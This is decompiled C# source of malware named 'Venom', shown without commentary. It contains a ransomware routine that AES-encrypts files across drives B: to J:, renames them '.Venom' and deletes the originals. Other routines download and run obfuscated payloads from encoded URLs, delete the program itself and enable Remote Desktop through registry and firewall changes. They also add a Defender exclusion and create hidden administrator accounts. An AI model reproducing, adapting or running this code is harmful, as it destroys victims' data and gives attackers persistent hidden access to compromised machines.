			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "J:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "I:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "H:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "G:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "F:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "E:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "D:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "B:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
	}

	public static void smethod_6()
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetExecutingAssembly().Location,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Environment.Exit(0);
	}

	private static void smethod_7(string[] dizin, string[] uzantilar, string sifre, string crypt_uzantisi)
	{
		for (int i = 0; i < dizin.Length; i++)
		{
			for (int j = 0; j < uzantilar.Length; j++)
			{
				if (Directory.Exists(dizin[i]))
				{
					FileInfo[] files = new DirectoryInfo(dizin[i]).GetFiles("*." + uzantilar[j], SearchOption.AllDirectories);
					foreach (FileInfo fileInfo in files)
					{
						smethod_8(fileInfo.FullName, fileInfo.FullName + crypt_uzantisi, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
					}
				}
			}
		}
	}

	private static void smethod_8(string inputFile, string outputFile, byte[] passwordBytes)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(outputFile, FileMode.Create);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static void smethod_9()
	{
		try
		{
			string path = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			else
			{
				Directory.Delete(path);
				Directory.CreateDirectory(path);
			}
			smethod_29(Convert.FromBase64String(smethod_58(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEK1FHtY11RA+WKgpz8WlU6Uuwd54dHpyIPwGYkuAD9Fxg=="))))).ReadToEnd())));
			smethod_29(Convert.FromBase64String(smethod_58(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEK1FHtY11RA+WKgpz8WlU6UjHmYfbPuly+0KRBbK1rkYw=="))))).ReadToEnd())));
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_10()
	{
		smethod_29(Convert.FromBase64String(smethod_58(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZIngFw97hGp88lGESFOmRFuKhpfKiXJ68fR8c2qmRDFmZ2Ycy3e30jKppX/E7xkEib4/z67tZKoEYv83p/4+zBVVzKA5GBNJVAQeNlU2D356g=="))))).ReadToEnd())));
	}

	public static void smethod_11()
	{
		string path = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEIYvjDZa9XYE0+7rxNT6T+fjdAnjNI0zvODtDqjZNkCtlpSP03+0Q42bABNh30ix+w="))))).ReadToEnd();
		string text = Path.Combine(path, "invisible.exe");
		byte[] bytes = Convert.FromBase64String(smethod_60(encrypted));
		File.WriteAllBytes(text, bytes);
		Process.Start(text).WaitForExit();
	}

	public static void smethod_12()
	{
		smethod_80();
		smethod_85();
		Thread.Sleep(15000);
		StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "dvnc.bat"));
		streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
		streamWriter.WriteLine("set exeFile=%TEMP%\\Install.exe");
		streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
		streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('deadlink','%exeFile%');");
		streamWriter.Close();
		string fileName = Path.Combine(Path.GetTempPath(), "dvnc.bat");
		Process.Start(new ProcessStartInfo
		{
			FileName = fileName,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		})!.WaitForExit();
		string fileName2 = Path.Combine(Path.GetTempPath(), "Install.exe");
		Process.Start(new ProcessStartInfo
		{
			FileName = fileName2,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		})!.WaitForExit();
		Thread.Sleep(30000);
		smethod_85();
	}

	public static void smethod_13()
	{
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Process[] processesByName = Process.GetProcessesByName("winvnc");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Venom-winvnc");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	public static void smethod_14()
	{
		smethod_80();
		smethod_85();
		smethod_13();
		string text = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s " + text + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Directory.Delete(text, recursive: true);
		smethod_114();
		File.SetAttributes(text, FileAttributes.Normal);
		File.Delete(text);
	}

	public static void smethod_15()
	{
		string text = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZLpApyDHLbEXqnGn1FyZg7Eq9i/pG9iADhVnXwVkBIvQwJiMaH4nY12/3X8x8A4ufBXH6ygZHRLMSEsYfY0zx/zb1BUKgiM1jQi0uo9uE/PzA=="))))).ReadToEnd();
		string string_0 = Path.Combine(text, "newdpr.exe");
		byte[] bytes = Convert.FromBase64String(smethod_58(encrypted));
		File.WriteAllBytes(string_0, bytes);
		Task.Run(() => Process.Start(string_0)).Wait();
	}

	public static void smethod_16()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
		if (registryKey == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
			registryKey.SetValue("fDenyTSConnections", 0);
		}
		else
		{
			registryKey.SetValue("fDenyTSConnections", 0);
		}
		registryKey.Flush();
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
		if (registryKey2 == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
			registryKey2.SetValue("UserAuthentication", 1);
		}
		else
		{
			registryKey2.SetValue("UserAuthentication", 1);
		}
		registryKey2.Flush();
		RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", writable: true);
		if (registryKey3 == null)
		{
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", writable: true);
			registryKey3.SetValue("fSingleSessionPerUser", 0);
		}
		else
		{
			registryKey3.SetValue("fSingleSessionPerUser", 0);
		}
		registryKey3.Flush();
		RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
		if (registryKey4 == null)
		{
			Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
			registryKey4.SetValue("fSingleSessionPerUser", 0);
		}
		else
		{
			registryKey4.SetValue("fSingleSessionPerUser", 0);
		}
		registryKey4.Flush();
		try
		{
			RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
			if (registryKey5 != null && registryKey5.GetValue("Venom") != null)
			{
				registryKey5.SetValue("Venom", "0");
			}
			Console.WriteLine("Venom desactivated");
		}
		catch (Exception)
		{
			smethod_98("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Venom -PropertyType DWord -Value 0 -Force");
		}
		RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
		if (registryKey6 == null)
		{
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", writable: true);
			registryKey6.SetValue("Venom", 0);
		}
		else
		{
			registryKey6.SetValue("Venom", 0);
		}
		registryKey6.Flush();
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_17(string username)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DirectoryEntry val = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
			DirectoryEntry val2 = val.get_Children().Find(username, "user");
			val.get_Children().Remove(val2);
			val2.Close();
			val.Close();
		}
		catch (Exception ex)
		{
			throw ex;
		}
	}

	public static bool smethod_18(string name)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " /delete");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text != "")
		{
			if (text.ToLower().Contains("command completed successfully."))
			{
				return true;
			}
			return false;
		}
		return false;
	}

	public static bool smethod_19(string name)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		if (text != "")
		{
			if (text.ToLower().Contains("command completed successfully."))
			{
				processStartInfo = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.UseShellExecute = false;
				Process process2 = new Process();
				process2.StartInfo = processStartInfo;
				process2.Start();
				text = process2.StandardOutput.ReadToEnd();
				process2.WaitForExit();
				if (text != "" && text.ToLower().Contains("command completed successfully."))
				{
					return true;
				}
				return false;
			}
			return false;
		}
		return false;
	}

	public static string smethod_20()
	{
		string text = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 1; i <= 10; i++)
		{
			int index = random.Next(0, text.Length);
			char value = text[index];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static void smethod_21(string user)
	{
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0408: Unknown result type (might be due to invalid IL or missing references)
		//IL_040f: Expected O, but got Unknown
		//IL_048d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0494: Expected O, but got Unknown
		//IL_06f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f9: Expected O, but got Unknown
		//IL_0777: Unknown result type (might be due to invalid IL or missing references)
		//IL_077e: Expected O, but got Unknown
		switch (Environment.OSVersion.Version.Major)
		{
		case 6:
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey2 == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey2.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey2.SetValue("dontdisplaylastusername", 1);
			}
			registryKey2.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey2.SetValue("DWORD", 2);
			}
			registryKey2.Flush();
			PrincipalContext val4 = null;
			try
			{
				Console.WriteLine("Building System Information");
				val4 = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex4)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex4);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val4, user) != null)
			{
				Console.WriteLine(user + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val5 = new UserPrincipal(val4);
			((Principal)val5).set_Name(user);
			((Principal)val5).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val5).set_PasswordNeverExpires(true);
			((AuthenticablePrincipal)val5).SetPassword(user);
			((AuthenticablePrincipal)val5).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val5).Save();
			}
			catch (Exception ex5)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex5);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val6 = null;
			try
			{
				val6 = GroupPrincipal.FindByIdentity(val4, "Administrators");
				if (val6 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val6.get_Members().Contains(val4, (IdentityType)0, user))
					{
						Console.WriteLine("Administrators already contains " + user);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val6.get_Members().Add(val5);
